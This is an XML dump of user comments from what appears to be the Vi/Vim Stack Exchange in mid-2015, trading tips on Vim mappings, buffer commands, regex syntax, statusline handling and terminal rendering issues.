  <row Id="5920" PostId="4055" Score="0" Text="@Vitor I like the idea of your solution because it doesn't clobber the jump registers, but it doesn't seem to work: after executing that `nnoremap`, the `*` key doesn't seem to do anything." CreationDate="2015-07-29T21:27:59.757" UserId="2982" />
  <row Id="5921" PostId="4055" Score="0" Text="@Vitor Oops, I put the `&lt;silent&gt;` in the wrong place -- as did garyjohn! Your code works well, thanks." CreationDate="2015-07-29T21:35:52.097" UserId="2982" />
  <row Id="5922" PostId="4073" Score="0" Text="*&quot;I got no idea why there are some c++ highlights in c.vim&quot;* -&gt; C and C++ share a lot of syntax; at some point someone decided that putting them in the same syntax file was a good idea (`cpp.vim` sources `c.vim`) ... There's something to be said for that ..." CreationDate="2015-07-29T21:44:21.773" UserId="51" />
  <row Id="5923" PostId="4075" Score="1" Text="Fully autocompleting Ruby is much harder than C++ due to the dynamic nature of Ruby. Rails uses quite a bit of the &quot;meta-programming&quot; features of Ruby. For example, [completing something like this](https://github.com/rails/rails/blob/master/actionview/lib/action_view/helpers/form_helper.rb#L1344) will be very hard unless you're running a full Rails application." CreationDate="2015-07-29T21:52:28.623" UserId="51" />
  <row Id="5924" PostId="4061" Score="0" Text="Instead of `bufdo w` you could `wall` and avoid changing buffer." CreationDate="2015-07-29T22:06:15.943" UserId="630" />
  <row Id="5925" PostId="4067" Score="0" Text="thanks for the link.. it helps really.." CreationDate="2015-07-29T22:13:36.693" UserId="2988" />
  <row Id="5926" PostId="4072" Score="0" Text="The part about knowing the length of the status line when building it only works when it doesn't contain things like `'%c'`, since those are calculated by vim afterwards.  However, those special status line characters can be emulated by vimscript most of the time, it just removes the convenience of them." CreationDate="2015-07-29T22:19:43.703" UserId="865" />
  <row Id="5927" PostId="4056" Score="0" Text="Which plugin you use for python code complete? For example `jedi-vim` have option `g:jedi#auto_close_doc`." CreationDate="2015-07-29T22:24:05.463" UserId="1145" />
  <row Id="5928" PostId="4072" Score="0" Text="Yes, that's inconvenient (and can be circumvented, as you say). That's why I used `expand('%')` as example, instead of `%f`. The thing is, Vim doesn't seem to allow peeking at the *evaluated* statusline anywhere (e.g. to get its length)." CreationDate="2015-07-29T22:27:34.133" UserId="1800" />
  <row Id="5929" PostId="4050" Score="0" Text="[This mapping](http://vim.wikia.com/wiki/VimTip99) uses `synIDattr()` to obtain syntax groups for the character under the cursor. You could write a function that performs the search (or does `normal n`) and then uses `synIDattr()` to decide whether to stay at this location, or continue the search forwards." CreationDate="2015-07-29T22:45:00.503" UserId="630" />
  <row Id="5930" PostId="4047" Score="0" Text="If you hate that behaviour of `:bufdo` then you can use [my `:BufDo` command](https://github.com/joeytwiddle/rc_files/blob/77f1e3e79c89105716f2e9cd7d6414b3237d9e05/.vim/plugin/joeycommands.vim#L161-175) which returns you to the buffer you started on." CreationDate="2015-07-29T22:52:14.577" UserId="630" />
  <row Id="5931" PostId="4077" Score="0" Text="Vim seems to only offer one level of MRU file history, exposed on CTRL-^.  However I have noticed when using `:kwbd` to close a few buffers, that Vim does step back to the previous buffers in the expected reverse-historical order.  Perhaps Vim has a MRU list which it isn't sharing with us, or perhaps it chooses which buffer to fall back to based on the CTRL-O location history (`:jumps`)." CreationDate="2015-07-29T23:27:24.623" UserId="630" />
  <row Id="5932" PostId="4023" Score="0" Text="To avoid the CTRL-C issue, you could run MacVim instead. Or you could redefine rope's mappings to start with a different prefix key." CreationDate="2015-07-29T23:44:02.263" UserId="630" />
  <row Id="5933" PostId="3997" Score="0" Text="I do something similar [with a mapping](https://github.com/joeytwiddle/rc_files/blob/eeb3fdf0f7040d29b02f9de62d0398355f49fc8c/.vim/ftplugin/javascript.vim#L18-22).  My version clobbers the default register, but we could clobber a different register, e.g. `l` by using `&quot;ly` instead of `y` and `&lt;C-R&gt;l` instead of `&lt;C-R&gt;&quot;`." CreationDate="2015-07-30T00:14:25.153" UserId="630" />
  <row Id="5934" PostId="4076" Score="0" Text="I wasn't aware of `:wa`, thought writing all changed buffers would be more complicated!" CreationDate="2015-07-30T06:45:27.697" UserId="2357" />
  <row Id="5935" PostId="4081" Score="1" Text="You probably updated your terminal emulator to send the escape key on Alt. See: [How to map Alt key?](http://vi.stackexchange.com/q/2350/51) and [`:help :map-alt-keys`](http://vimhelp.appspot.com/map.txt.html#%3amap%2dalt%2dkeys)" CreationDate="2015-07-30T09:49:39.793" UserId="51" />
  <row Id="5936" PostId="4081" Score="0" Text="Ah thanks for that, back to normal now." CreationDate="2015-07-30T09:55:42.637" UserId="2997" />
  <row Id="5937" PostId="3174" Score="0" Text="Same issue here with Vim 7.4 on Debian 8. Is this worth a bugreport?" CreationDate="2015-07-30T10:34:50.413" UserId="2978" />
  <row Id="5938" PostId="4081" Score="0" Text="You could add your solution to the other question as an answer, if it's different from the existing answers so that people with the same problem are able to find it :-)" CreationDate="2015-07-30T10:58:08.487" UserId="51" />
  <row Id="5939" PostId="4081" Score="0" Text="Yea so my issue was slightly different, I needed to update my terminal settings to disable 'Use Option as Meta Key' which had been enabled somehow. I just happened to get to that solution through `:help :map-alt-keys`" CreationDate="2015-07-30T11:02:02.510" UserId="2997" />
  <row Id="5940" PostId="4066" Score="0" Text="@jjaderberg - thank you. Seems that `makeprg` was set to `make` instead of `gradle` for some reason. Everything works fine now" CreationDate="2015-07-30T11:03:13.567" UserId="2725" />
  <row Id="5941" PostId="4081" Score="1" Text="That's exactly the same solution as the OP used in the other question ;-)" CreationDate="2015-07-30T12:12:14.997" UserId="51" />
  <row Id="5942" PostId="4081" Score="0" Text="haha, sure is! Saw the top voted comment not the accepted answer. Cheers!" CreationDate="2015-07-30T12:13:51.327" UserId="2997" />
  <row Id="5943" PostId="4023" Score="0" Text="Actually, I'm thinking that this might be due to rope not being compatible with python3, and my vim being compiled with only python3." CreationDate="2015-07-30T12:49:07.613" UserId="69" />
  <row Id="5944" PostId="4056" Score="0" Text="@AlexKroll to be honest, I have no idea. I think it might be Supertab. These are the plugins I've installed: https://github.com/murukeshm/vimrc/tree/master/bundle. I don't have Jedi installed." CreationDate="2015-07-30T12:52:03.023" UserId="205" />
  <row Id="5945" PostId="4056" Score="1" Text="@muru `g:SuperTabClosePreviewOnPopupClose (default 0)`&#xA;Looks like it's what you want `:he supertab-closepreviewonpopupclose`" CreationDate="2015-07-30T12:59:54.023" UserId="1145" />
  <row Id="5947" PostId="2914" Score="0" Text="@jecxjo instead of `v$xh` you could just use `D`." CreationDate="2015-07-30T14:36:31.733" UserId="2620" />
  <row Id="5951" PostId="2285" Score="0" Text="@jalanb Thanks! I tried it out and it seemed to work fine without it, so I removed it in the code above." CreationDate="2015-07-30T17:12:37.020" UserId="1111" />
  <row Id="5952" PostId="4091" Score="0" Text="Here's an old discussion highlighting the pro's and con's of such an approach, and suggesting instead something that today could be translated as: multiple vim instances (one per project/buffer list) + tmux: http://vim.1045645.n5.nabble.com/Different-buffer-list-for-different-tabs-td1178136.html" CreationDate="2015-07-30T17:24:41.293" UserId="1800" />
  <row Id="5953" PostId="4095" Score="0" Text="+1 for introducing me to redir. :D" CreationDate="2015-07-30T18:24:28.057" UserId="72" />
  <row Id="5954" PostId="4060" Score="4" Text="Personally, I find that having the control key immediately to the left of 'A' (where caps lock is on most modern keyboards) a lot more convenient than its usual location below the left shift key. I've discussed ways of remapping it on various systems [here](http://the-flat-trantor-society.blogspot.com/2013/12/where-should-control-key-be.html)." CreationDate="2015-07-30T18:24:38.797" UserId="2380" />
  <row Id="5955" PostId="4074" Score="0" Text="I am neither reponsible for the bug nor the fix. I just remembered the issue. But the easiest fix is get a newer Vim, because it will contain updated runtime files. The second best option is to manually download the file from github/googlecode/ftp.vim.org and put it into your ~/.vim/syntax/ directory. This has the disadvantage, that you don't get updated syntax files, once you update your vim later." CreationDate="2015-07-30T18:57:15.050" UserId="71" />
  <row Id="5956" PostId="4100" Score="0" Text="so far commentary is very useful, thanks for the suggestion." CreationDate="2015-07-30T19:45:26.700" UserId="3005" />
  <row Id="5957" PostId="4102" Score="0" Text="Buffer commands like `:b` can take partial filenames. Then use `&lt;tab&gt;` completion to deal with multiple matches. No more worrying about `:ls`." CreationDate="2015-07-30T19:46:41.967" UserId="778" />
  <row Id="5958" PostId="4102" Score="0" Text="@Peter. That's very true and I use that all the time. The problem is though that I am dealing with OS code and file names get pretty ugly and pretty meaningless. :D Sometimes I want to see the filename I need to switch to and that's where GUI's &quot;Buffers&quot; menu is helpful." CreationDate="2015-07-30T20:17:33.013" UserId="3006" />
  <row Id="5959" PostId="4104" Score="3" Text="Did you try inserting a literal tab character in the regexp? With `&lt;C-v&gt;&lt;Tab&gt;`?" CreationDate="2015-07-30T22:27:49.683" UserId="51" />
  <row Id="5961" PostId="4102" Score="1" Text="Why not simply use netrw? `:Ex`, see `:help netrw`." CreationDate="2015-07-31T07:23:20.490" UserId="54" />
  <row Id="5962" PostId="4091" Score="0" Text="@VanLaser: Thanks for the link it's an interesting discussion! I actually include tmux and different vim instances when I'm on my personal machine. My question comes from the fact that I have to use windows for my professional work and I **really** don't like how the windows are handled: using `alt+tab` (or even worse the mouse) feels much less easy than switching tab within vim." CreationDate="2015-07-31T07:27:56.900" UserId="1841" />
  <row Id="5963" PostId="4097" Score="0" Text="I agree with the idea that using separate vim instances is better when I can use it in a terminal, as I said in another comment I have to use windows on my professional computer and switching between gvim instances is a pain in the butt with this OS. I'll take a look at the arguments I've never used it before and that might be a good workaround, thanks!" CreationDate="2015-07-31T07:31:06.750" UserId="1841" />
  <row Id="5964" PostId="4092" Score="0" Text="I didn't find a plugin neither and I was hoping for a built-in feature to do so but it seems that you're right I'll probably have to do it by myself. Thanks for your code I might use it has a base to develop a full plugin." CreationDate="2015-07-31T07:34:36.030" UserId="1841" />
  <row Id="5965" PostId="4104" Score="0" Text="Your syntax command line works for me, highlighting everything from the tab to the end of the line. I'm on Vim 7.4 too." CreationDate="2015-07-31T09:29:29.270" UserId="2942" />
  <row Id="5966" PostId="4108" Score="0" Text="If I understand your question correctly, this is the same as [How to achieve selection different length of texts on different lines](http://vi.stackexchange.com/q/2796/51)?" CreationDate="2015-07-31T09:45:40.660" UserId="51" />
  <row Id="5967" PostId="2085" Score="0" Text="How to get rid of the split?? :-/" CreationDate="2015-07-31T09:58:37.783" UserId="3012" />
  <row Id="5968" PostId="2085" Score="0" Text="See: [GNU Screen Splitting](http://tomlee.co/2011/10/gnu-screen-splitting/)" CreationDate="2015-07-31T10:00:14.300" UserId="467" />
  <row Id="5969" PostId="4108" Score="0" Text="No, it's not possible." CreationDate="2015-07-31T10:31:43.787" UserId="54" />
  <row Id="5970" PostId="4091" Score="0" Text="*Maybe* [vim-ctrlspace](https://github.com/szw/vim-ctrlspace) can help - it advertises per tabpage buffer lists; I don't use it, though." CreationDate="2015-07-31T10:33:56.523" UserId="1800" />
  <row Id="5972" PostId="4066" Score="0" Text="Solved by comment from @jjaderberg" CreationDate="2015-07-31T08:56:41.190" UserId="2725" />
  <row Id="5973" PostId="4066" Score="1" Text="@siphiuel I think you did something with `makeprg`, but what? Could you post what you did to fix it as an answer? That was other people will be able to find it and benefit from it :-)" CreationDate="2015-07-31T11:41:00.830" UserId="51" />
  <row Id="5974" PostId="4091" Score="0" Text="I'll give it a try thanks." CreationDate="2015-07-31T12:39:55.127" UserId="1841" />
  <row Id="5975" PostId="4102" Score="0" Text="@romainl. Thank you for the response. I use `:Vex` and `:Sex` frequently as well. They serve a different purpose however: files are not in the same directory and can be pretty spread out." CreationDate="2015-07-31T12:44:51.233" UserId="3006" />
  <row Id="5976" PostId="4111" Score="1" Text="Your question might be also closed because SE sites are for precises questions and yours might be too broad. Other than that Pratical Vim is an **amazing** book and reading it is a really good idea. After that I think the best way to learn is to use vim daily and each time you find something which feels unatural (or against vim philosophy) you note it down and try to find a better way to do it." CreationDate="2015-07-31T13:06:58.343" UserId="1841" />
  <row Id="5977" PostId="4066" Score="0" Text="Added a proper answer. Thanks for putting this in order. I must admit that first i didn't properly understand what fixed it exactly:). But comments pointed in the right direction. Thanks again everyone." CreationDate="2015-07-31T13:16:33.947" UserId="2725" />
  <row Id="5978" PostId="4116" Score="6" Text="Unlike some implementations of regular expression engines, Vim's doesn't seem to support that notation. `[[:space:][:alnum:]_]` can be used to approximate the collection of `\s` and `\w`, though." CreationDate="2015-07-31T14:36:14.073" UserId="2942" />
  <row Id="5979" PostId="4104" Score="0" Text="That's interesting... I did try `&lt;C-v&gt;&lt;Tab&gt;`, yes, sorry for missing that. It inserts a `^I` character, and it doesn't work either." CreationDate="2015-07-31T15:38:55.267" UserId="2036" />
  <row Id="5980" PostId="4117" Score="1" Text="Just because one can construct an invalid range in a character class doesn't mean that it shouldn't be possible to use something like `\s` in a character class.  Vim's regex implementation happens to have made that choice, but other implementations allow you to use `[\s]`." CreationDate="2015-07-31T16:46:15.210" UserId="15" />
  <row Id="5981" PostId="4117" Score="0" Text="That's good to know, thanks." CreationDate="2015-07-31T17:24:39.813" UserId="1800" />
  <row Id="5982" PostId="4123" Score="0" Text="Hey cool way to improve it! I didn't know you can do that." CreationDate="2015-07-31T18:20:18.873" UserId="1841" />
  <row Id="5983" PostId="3865" Score="0" Text="... and the explanation: when `paste` is on, Insert mode mappings are disabled (as per Vim's help)" CreationDate="2015-07-31T18:34:34.863" UserId="1800" />
  <row Id="5984" PostId="4123" Score="1" Text="You could even split the group in 2 parts and remove the `else` branch, by running  the `autocmd!` unconditionally at the beginning." CreationDate="2015-07-31T18:58:55.357" UserId="1800" />
  <row Id="5985" PostId="4123" Score="0" Text="@VanLaser Could you?  Have you tried doing it that way?  Hint: what would `exists('#TestAutoGroup#BufEnter')` return after an `autocmd!`?" CreationDate="2015-07-31T19:08:04.887" UserId="2313" />
  <row Id="5986" PostId="4056" Score="0" Text="@AlexKroll Yes, that did the trick, thanks!" CreationDate="2015-07-31T19:11:51.000" UserId="205" />
  <row Id="5987" PostId="4123" Score="0" Text="Indeed, the `if` would be executed every time. Would work with a global variable, though. I just feel the need to help, when I see repeating lines of code, even if I'm proved wrong (but this is how I learn)." CreationDate="2015-07-31T19:13:01.283" UserId="1800" />
  <row Id="5988" PostId="4123" Score="1" Text="Something like this, maybe: http://pastebin.com/HEEYjseR" CreationDate="2015-07-31T19:20:39.700" UserId="1800" />
  <row Id="5989" PostId="4125" Score="0" Text="I'm not sure to understand why you think it is an easy way: I'm not a vimscript master so your syntax seems a little bit overcomplicated to me. What are the pros of you method?" CreationDate="2015-07-31T19:28:07.323" UserId="1841" />
  <row Id="5990" PostId="4125" Score="0" Text="Pros: 1) No function. 2) Can easily be adapted to use a buffer/window local variables instead of a global variable. 3) Simple mapping" CreationDate="2015-07-31T20:32:08.423" UserId="778" />
  <row Id="5991" PostId="4028" Score="1" Text="You might be better off just putting your vimrc in the rc folder and using a symlink for ~/.vimrc, like so: `ln -s ~/rc/vimrc ~/.vimrc`. That way, you don't have to worry about copying it back and forth from ~ and rc." CreationDate="2015-07-31T23:22:31.623" UserId="2736" />
  <row Id="5992" PostId="4126" Score="0" Text="That depends on how you compile and run it? What do you use? `:make`?" CreationDate="2015-08-01T00:58:23.157" UserId="205" />
  <row Id="5993" PostId="4127" Score="2" Text="Because mapping `&lt;s-c&gt;` in insert mode means `Shift-c` or an uppercase letter c.  Thus, you cannot type an uppercase letter c in insert mode." CreationDate="2015-08-01T01:26:05.643" UserId="865" />
  <row Id="5994" PostId="4126" Score="0" Text="@muru No, I just typed :!g++ E9.26.cpp then ran the program with :!./a.out." CreationDate="2015-08-01T01:32:57.540" UserId="3022" />
  <row Id="5995" PostId="4125" Score="0" Text="Ok. Thank you for sharing your solution I wouldn't have thought of doing it this way!" CreationDate="2015-08-01T09:01:12.607" UserId="1841" />
  <row Id="5996" PostId="4074" Score="0" Text="My bad, I saw that you closed the issue with reference to a revision (at least I think that was you). I assumed you submitted the revision as well. In general I think an explanation to go with the link would enhance understanding, but since the question is put on hold as duplicate it probably doesn't matter." CreationDate="2015-08-01T09:06:58.440" UserId="1306" />
  <row Id="5997" PostId="4131" Score="0" Text="This is not vim related this is a problem with github. More precisely it seems that you are behind a firewall or an antivirus which doesn't accept git connections [;-)](http://en.lmgtfy.com/?q=github+rpc+failed+result%3D56+http+code%3D200&amp;l=1)" CreationDate="2015-08-01T12:33:00.203" UserId="1841" />
  <row Id="5998" PostId="4131" Score="0" Text="I'm using my personal computer not behind a firewall. I'm using vundle install other plugins and using git cloning other repositories without any issue, so it's not a git connection issue." CreationDate="2015-08-01T12:48:17.573" UserId="1276" />
  <row Id="5999" PostId="4131" Score="0" Text="Then those informations should be added to your question otherwise it's pretty hard to help you." CreationDate="2015-08-01T12:52:42.840" UserId="1841" />
  <row Id="6000" PostId="4123" Score="1" Text="@VanLaser And then you could make that operation stateless, by getting rid of that global variable.  Perhaps there's a function that could take care of that.  That function might need to... Ow.  Right. :)" CreationDate="2015-08-01T13:17:31.830" UserId="2313" />
  <row Id="6001" PostId="4133" Score="0" Text="Oh it seems that my `cmdheight` was set at 4 and my function output 3 lines so I didn't get the message and as I didn't know that was an automatical behavior I didn't understand why I didn't get it. Thank you!" CreationDate="2015-08-01T13:45:10.423" UserId="1841" />
  <row Id="6002" PostId="4133" Score="0" Text="You're welcome :)" CreationDate="2015-08-01T13:45:38.003" UserId="1800" />
  <row Id="6003" PostId="4134" Score="1" Text="`py vim.current.buffer.append(str(sum([x^2 for x in range(100)])), vim.current.window.cursor[0])`" CreationDate="2015-08-01T16:37:18.057" UserId="1145" />
  <row Id="6004" PostId="4134" Score="0" Text="@AlexKroll This gives me an error:&#xA;&#xA;    `Traceback (most recent call last):&#xA;       File &quot;&lt;string&gt;&quot;, line 1 in &lt;module&gt;&#xA;    NameError: name 'vim' is not defined`" CreationDate="2015-08-01T18:21:50.050" UserId="2804" />
  <row Id="6005" PostId="4134" Score="1" Text="'py import vim' of course!" CreationDate="2015-08-01T18:23:34.323" UserId="1145" />
  <row Id="6006" PostId="4134" Score="0" Text="@AlexKroll I was completely unaware that Python had a vim module (or does it?) I prefer your solution to philolo1's but if someone could point me to a command to append the result to a register, that would be great.&#xA;If you make this an answer I'll probably accept it." CreationDate="2015-08-01T18:34:04.903" UserId="2804" />
  <row Id="6007" PostId="4134" Score="0" Text="If your Vim compiled with `+python` or `+puthon3` internal Python interpreteur have module `vim`,&#xA;&#xA;`:he python-vim` for more exploration." CreationDate="2015-08-01T19:02:51.210" UserId="1145" />
  <row Id="6008" PostId="4135" Score="0" Text="I'm curious: why use `eval` instead of `python -c`?" CreationDate="2015-08-01T19:22:13.823" UserId="205" />
  <row Id="6009" PostId="4135" Score="0" Text="No reason, i did not know the command, so you can also so do &#xA;python -c &quot;[x^2 for x in range(100)]&quot;." CreationDate="2015-08-02T01:42:17.937" UserId="3003" />
  <row Id="6010" PostId="4135" Score="0" Text="`python -c 'print [x^2 for x in range(100)]'`, but yes." CreationDate="2015-08-02T01:42:50.883" UserId="205" />
  <row Id="6011" PostId="4117" Score="0" Text="@VanLaser If you edit the answer with this info ([\s] is a possibilty in other regex-implementations but not in vim) i'll accept your answer!" CreationDate="2015-08-02T05:23:09.223" UserId="129" />
  <row Id="6012" PostId="4132" Score="0" Text="`echomsg` is your friend.  See also `:help interactive-functions`." CreationDate="2015-08-02T07:28:17.797" UserId="2313" />
  <row Id="6013" PostId="4060" Score="0" Text="Another option is to put the Control key next to the space bar (where Alt is now), so you can press it with your thumb. That is where it used to be on early terminal systems. http://world.std.com/~jdostale/kbd/SpaceCadet1.jpeg" CreationDate="2015-08-02T09:25:48.763" UserId="630" />
  <row Id="6014" PostId="4136" Score="0" Text="It looks to me like this uses vim to evaluate the expression and not python." CreationDate="2015-08-02T11:23:35.577" UserId="2804" />
  <row Id="6015" PostId="4136" Score="0" Text="You're right! Look edited answer!" CreationDate="2015-08-02T12:20:18.553" UserId="1145" />
  <row Id="6016" PostId="4132" Score="0" Text="@SatoKatsura: I'm not sure using `echom` wouldn't change the behavior of the &quot;pause&quot; after the message and the user has to use the command `:messages` to see what was output which isn't very convenient in my opinion." CreationDate="2015-08-02T12:23:56.697" UserId="1841" />
  <row Id="6017" PostId="4117" Score="0" Text="(all right, added)" CreationDate="2015-08-02T14:53:18.283" UserId="1800" />
  <row Id="6018" PostId="4136" Score="0" Text="This is exactly what I had in mind. I added support for floating point numbers to avoid `E806: using Float as a String`." CreationDate="2015-08-02T15:31:30.863" UserId="2804" />
  <row Id="6019" PostId="4132" Score="0" Text="`echomsg` messages are persistent, `echo` ones are ephemeral, they're gone at the next refresh whether you managed to see them or not.  The point is, you should probably adapt what you want to do to the way Vim works, rather than trying to do it the other way around." CreationDate="2015-08-02T16:59:06.537" UserId="2313" />
  <row Id="6020" PostId="4132" Score="0" Text="Maybe &quot;persistent&quot; wasn't the best word to describe what I meant: I just wanted to get the line waiting for a user input (and VanLaser answer was excatly the explanation I needed). But you're right `echom` are more persistent. Also I can't agree more with you when you say that I should follow the way Vim works, that's what I'll try to do ;-)" CreationDate="2015-08-02T17:48:22.383" UserId="1841" />
  <row Id="6021" PostId="4140" Score="2" Text="Filed https://code.google.com/p/vim/issues/detail?id=390 for it. There was a related older issue https://code.google.com/p/vim/issues/detail?id=183 which was closed as not reproducible and presumed fixed by patch 7.4.207." CreationDate="2015-08-02T21:27:28.957" UserId="824" />
  <row Id="6022" PostId="4142" Score="0" Text="thanks `:set expandtab` allowed me to use spaces instead of tabs for indentation" CreationDate="2015-08-02T23:45:16.707" UserId="3030" />
  <row Id="6023" PostId="4028" Score="0" Text="@8bittree: That ... That would be indeed better." CreationDate="2015-08-03T06:50:19.800" UserId="622" />
  <row Id="6024" PostId="4144" Score="0" Text="What problems are you facing? Does the text look wrong? Or are you having problems inputting characters? Or something else?" CreationDate="2015-08-03T08:21:57.270" UserId="51" />
  <row Id="6025" PostId="4149" Score="2" Text="Better yet: `:'&lt;,'&gt;-1s/\n/, /` for marked lines, or `:1,$-1s/\n/, /` for the entire file." CreationDate="2015-08-03T08:33:34.473" UserId="2313" />
  <row Id="6026" PostId="4149" Score="0" Text="Indeed, that's even better :)" CreationDate="2015-08-03T08:35:18.800" UserId="1800" />
  <row Id="6028" PostId="4155" Score="0" Text="The thing with `global` is that one should use `normal` only at the end of the pattern. In my understanding, you can't &quot;come back&quot; to cmd mode once you went to using `normal`. I can't find the reference, and I hope I'm not mistaken (maybe somebody knows better and can intervene with details/corrections)." CreationDate="2015-08-03T11:16:28.363" UserId="1800" />
  <row Id="6029" PostId="4155" Score="0" Text="Well, the command may be one long `normal` command, but that should be ok, shouldn't it? F.i. I begin the substitute from within the normal command with `:/s` rather than using `bar` and a separate ex command, ` | s/`." CreationDate="2015-08-03T11:32:25.363" UserId="1306" />
  <row Id="6030" PostId="4155" Score="0" Text="I know you can't use `|` to separate commands after `normal` since it is treated as an argument and not a command separator. I tried using `execute &quot;normal ...&quot;` as well, but then I had to do lots of escaping in the search and substitute patterns (e.g., `\\s`)." CreationDate="2015-08-03T11:33:11.523" UserId="1306" />
  <row Id="6032" PostId="4124" Score="0" Text="Thanks, `:SQLSetType` was exactly what I needed." CreationDate="2015-08-03T12:30:36.460" UserId="1453" />
  <row Id="6033" PostId="4146" Score="1" Text="Very nifty technique! It looks like this solution would work great with multiple files having the same namespace to convert, since it remembers the IDs globally. My answer falls short there." CreationDate="2015-08-03T12:40:52.860" UserId="227" />
  <row Id="6034" PostId="4150" Score="0" Text="&quot;If all you have is a hammer everything looks like a nail.&quot; - For more complex text manipulation tasks one should better use standard text processors (awk, perl, ...) than an editor. - E.g. with awk (assuming the data fields are TAB separated, otherwise the `\t` has to be redefined): `BEGIN {FS=&quot;\t&quot;;OFS=&quot;,&quot;} /^[^\t]/{s=$0;next} {print s,$2,$3}` - Since this is &quot;OT&quot; I just provide this comment. I think it's worth to get a feeling when it's appropriate to switch tools." CreationDate="2015-08-03T12:48:43.007" UserId="2479" />
  <row Id="6035" PostId="4159" Score="1" Text="I'm not really sure what you're asking here..." CreationDate="2015-08-03T13:35:33.880" UserId="51" />
  <row Id="6036" PostId="4159" Score="3" Text="Could you give an example of what you want to do? It is not clear in this question I think you're looking for visual block mode but I'm not sure. EDIT: CarpetSmoker the Lucky Luke of comments was faster :-)" CreationDate="2015-08-03T13:35:56.683" UserId="1841" />
  <row Id="6037" PostId="4162" Score="0" Text="`gqie` does what I want when inside a begin...end block, in the main text body it tries to wrap everything until \end{document} - is there a way to tell it to stop at the next blank line?" CreationDate="2015-08-03T13:53:02.190" UserId="3034" />
  <row Id="6038" PostId="4162" Score="0" Text="Well, outside an environment - maybe the default `gqap` ?" CreationDate="2015-08-03T13:54:34.127" UserId="1800" />
  <row Id="6040" PostId="4162" Score="0" Text="See the updated answer, for a possible `F8` remapping." CreationDate="2015-08-03T14:19:43.950" UserId="1800" />
  <row Id="6041" PostId="4162" Score="0" Text="I presume I have a typo somewhere as the following doesn't work: `:map &lt;F8&gt; gq/\(^$\|^[%]$\|^\\end\)&lt;CR&gt;`. Can anyone tell me what I'm doing wrong? I'm trying to match a completely empty line (`^$`), a line with only a % comment character (`^[%]$`) or a line starting `\end` (`^\\end`)." CreationDate="2015-08-03T14:23:12.520" UserId="3034" />
  <row Id="6042" PostId="4162" Score="0" Text="I think you must use `\\|` as separator instead of `\|` when mapping." CreationDate="2015-08-03T14:25:32.390" UserId="1800" />
  <row Id="6043" PostId="4162" Score="0" Text="That was it! (Although it's `\\|` not `\\I`.)&#xA;The expression that I finally chose: &#xA;`gq/\(^$\\|^[%]$\\|^\\end\)`" CreationDate="2015-08-03T14:27:05.773" UserId="3034" />
  <row Id="6044" PostId="4162" Score="0" Text="Yes, ninja edited :)" CreationDate="2015-08-03T14:27:58.190" UserId="1800" />
  <row Id="6046" PostId="4144" Score="0" Text="Check this one http://serverfault.com/questions/158473/languages-in-vim-editor" CreationDate="2015-08-03T14:46:24.783" UserId="1145" />
  <row Id="6047" PostId="4144" Score="0" Text="@Carpetsmoker Yes, the text looks wrong, in different ways depending on which terminal emulator I try to run vim in. Somebody has made a nice overview of the different output he gets, http://benizi.com/vim/devanagari/ , which is not exactly the same for me, but you can get a rough idea about the varieties of output, none of which is correct. In fact, in contrast to the author of mentioned website, I get the best results in `konsole`." CreationDate="2015-08-03T15:48:05.163" UserId="2774" />
  <row Id="6048" PostId="4144" Score="0" Text="@AlexKroll Yes, I know there are other ways to input devanagari in linux, that is not the problem. I can use `gedit` if I must, it does work for devanagari input, however I'd just like to stick with `vim`. `Emacs` seems to handle Devanagari without problem, I might learn it because of that, as I now have to regularly edit files containing pieces of text in devanagari script." CreationDate="2015-08-03T16:01:32.300" UserId="2774" />
  <row Id="6049" PostId="4144" Score="0" Text="If you're using a terminal emulator (Konsole), then the problem is in the terminal emulator. All Vim does is ask the terminal emulator *&quot;Hey, I have these characters with such and such code points, please render them for me. kthxbye&quot;*. gVim doesn't depend on a terminal emulator, but &quot;under the hood&quot; it's really a terminal emulator, I'm not surprised that a comparatively little used script doesn't work well (not all [Latin fonts work well with gVim either](http://vi.stackexchange.com/q/588/51))..." CreationDate="2015-08-03T17:16:19.383" UserId="51" />
  <row Id="6050" PostId="4144" Score="0" Text="... Emacs, on the other hand, has it's own drawing code, and is much more advanced in this area. Emacs is miles ahead of Vim when it comes to font support and good looking typography." CreationDate="2015-08-03T17:17:10.627" UserId="51" />
  <row Id="6051" PostId="4149" Score="0" Text="@SatoKatsura can you explain the `-1`?" CreationDate="2015-08-03T18:12:19.570" UserId="67" />
  <row Id="6052" PostId="4163" Score="1" Text="The Vim way might be to use a plugin like http://algorithm.com.au/code/vimacs/. :P Can you include an explanation of what these commands do in emacs?  A list of Ctrl/Alt/Meta-foo/bar is quite meaningless for anyone who doesn't use emacs. And Ctrl-W deletes the word before the cursor. Also, I have a feeling this is a bit too broad." CreationDate="2015-08-03T18:34:33.980" UserId="205" />
  <row Id="6053" PostId="4163" Score="1" Text="If we're going the plugin way you should check out https://github.com/tpope/vim-rsi" CreationDate="2015-08-03T19:14:34.013" UserId="428" />
  <row Id="6054" PostId="4164" Score="0" Text="Using motions (such as `End` or arrow keys) in `INSERT` mode is OK?" CreationDate="2015-08-03T19:46:15.990" UserId="2932" />
  <row Id="6055" PostId="4164" Score="4" Text="Of course, anything that makes your work easier." CreationDate="2015-08-03T19:57:04.997" UserId="54" />
  <row Id="6056" PostId="4156" Score="0" Text="Yes! This is exactly what I was doing, and yet it never occurred to me that I could execute a macro from `global//normal`. I kept building my commands in a buffer and yank-putting with `&lt;C-r&gt;` into the `:global` command. This would make it easier to build the actual command to be executed." CreationDate="2015-08-03T20:38:54.407" UserId="1306" />
  <row Id="6057" PostId="4149" Score="1" Text="@alxndr - it's used to skip the last line in the range/file: e.g. in the OP example, you don't want a comma after 32, and also you don't want to join it with the next line, if it exists. You can even use `'&lt;,'&gt;-s/\n/, /` or `1,$-s/\n/, /` as `-` is the same as `-1`." CreationDate="2015-08-03T20:41:14.617" UserId="1800" />
  <row Id="6058" PostId="4166" Score="2" Text="Writing is *NOT* linear. Anyone who can write prose (or code) from start to finish without performing some kind of edit is either insane or has the power of a God. For the rest of us we do more editing then writing and therefore thinking about your editor as performing edit commands (NORMAL mode) first and writing (INSERT mode) second is more efficient. And this is the true crux of why editors like Emacs, MS Word, Notepad, etc. are backwards in their approach. It is unfortunate that the mode-less concept exists but there must be a lowest common denominator." CreationDate="2015-08-03T20:54:27.920" UserId="544" />
